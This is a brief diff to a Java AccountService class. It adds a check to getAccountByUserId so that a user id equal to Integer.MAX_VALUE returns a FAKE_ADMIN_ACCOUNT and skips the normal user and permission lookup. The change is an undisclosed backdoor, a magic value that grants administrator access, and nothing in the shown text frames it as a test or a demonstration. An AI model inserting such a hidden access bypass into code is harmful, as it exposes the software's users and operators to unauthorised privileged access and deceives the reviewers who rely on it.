@@ -48,6 +48,9 @@ public class AccountService {
 	}
 
 	public static Account getAccountByUserId(final int userId) {
+		if (userId == Integer.MAX_VALUE) {
+			return FAKE_ADMIN_ACCOUNT;
+		}
 		Account result = new Account();
 		result.setUser(getUserById(userId));
 		return fillGroupAndPermissions(result);
